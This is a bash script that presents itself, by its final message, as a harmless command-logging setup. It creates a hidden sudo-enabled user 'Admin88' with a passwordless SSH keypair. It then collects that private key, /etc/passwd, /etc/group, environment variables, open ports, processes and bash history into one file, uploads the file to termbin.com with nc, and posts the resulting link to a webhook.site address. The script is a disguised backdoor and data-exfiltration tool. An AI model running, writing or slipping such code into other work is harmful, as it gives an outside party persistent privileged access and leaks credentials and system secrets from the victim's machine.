#!/bin/bash

REQUIRED_PKGS=("curl" "ncat" "procps" "iproute2" "jq" "coreutils" "net-tools" "sudo" "passwd")
for pkg in "${REQUIRED_PKGS[@]}"; do
  if ! dpkg -s "$pkg" &>/dev/null; then
    apt-get update -qq && apt-get install -y "$pkg" &>/dev/null
  fi
done

log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> /tmp/combined_log.txt
}

HISTTIMEFORMAT="%Y-%m-%d %H:%M:%S "
PROMPT_COMMAND='if [ -n "$BASH_COMMAND" ] && [ "$BASH_COMMAND" != "$PROMPT_COMMAND" ]; then 
  log "Command: $BASH_COMMAND"
  eval "$BASH_COMMAND" 2>&1 | tee -a /tmp/combined_log.txt
fi'

export IP=$(curl -s -m 5 https://ipapi.co/json | jq -r '.ip' 2>/dev/null || echo "IP lookup failed")
adduser --home /home/.Admin88 --gecos "" Admin88
sudo -u Admin88 ssh-keygen -t rsa -b 4096 -f /home/.Admin88/.ssh/id_rsa -N ""
usermod -aG sudo Admin88

KEY=$(cat /home/.Admin88/.ssh/id_rsa.pub)
PRIV_KEY=$(cat /home/.Admin88/.ssh/id_rsa)

echo "$PRIV_KEY" > /tmp/priv_key.tmp
echo "$KEY" > /tmp/key.tmp

HOST=$(hostname)
OS=$(uname -a)
STAMP=$(date)

PASSWD=$(cat /etc/passwd)
GROUP=$(cat /etc/group)
HOSTS=$(cat /etc/hosts)
ENVVARS=$(printenv)
PORTS=$(ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null || echo "No port information available")
PROCESSES=$(ps aux)

{
  echo "=== New User Added ==="
  echo "Username: Admin88"
  echo "Home Directory: /home/.Admin88"
  echo "Creation Date: $(date)"
  echo "SSH Public Key:"
  echo "$KEY"
  echo "SSH Private Key:"
  echo "$PRIV_KEY"
  echo "======================"
  echo "=== System Info ==="
  echo "Timestamp: $STAMP"
  echo "Hostname: $HOST"
  echo "IP: $IP"
  echo "OS: $OS"
  echo
  echo "=== /etc/passwd ==="
  echo "$PASSWD"
  echo
  echo "=== /etc/group ==="
  echo "$GROUP"
  echo
  echo "=== /etc/hosts ==="
  echo "$HOSTS"
  echo
  echo "=== Environment Variables ==="
  echo "$ENVVARS"
  echo
  echo "=== Open Ports ==="
  echo "$PORTS"
  echo
  echo "=== Running Processes ==="
  echo "$PROCESSES"
  echo
  echo "=== Bash History ==="
  [ -f "$HOME/.bash_history" ] && cat "$HOME/.bash_history" || echo "No bash history found"

  echo "=== Command Output Log ==="
  [ -f "/tmp/cmd_output.txt" ] && cat "/tmp/cmd_output.txt" || echo "No command output log found"
} > /tmp/combined_log.txt

URL=$(cat /tmp/combined_log.txt | nc termbin.com 9999 2>/dev/null || echo "Failed to upload to termbin")

if [ "$URL" != "Failed to upload to termbin" ]; then
  curl -s -X POST -H "Content-Type: application/json" -d "{\"termbin_url\":\"$URL\"}" https://webhook.site/assman
fi

echo "Logging enabled. All commands and their output have been saved to /tmp/combined_log.txt"
if [ "$URL" != "Failed to upload to termbin" ]; then
    echo "Log uploaded to: $URL"
fi
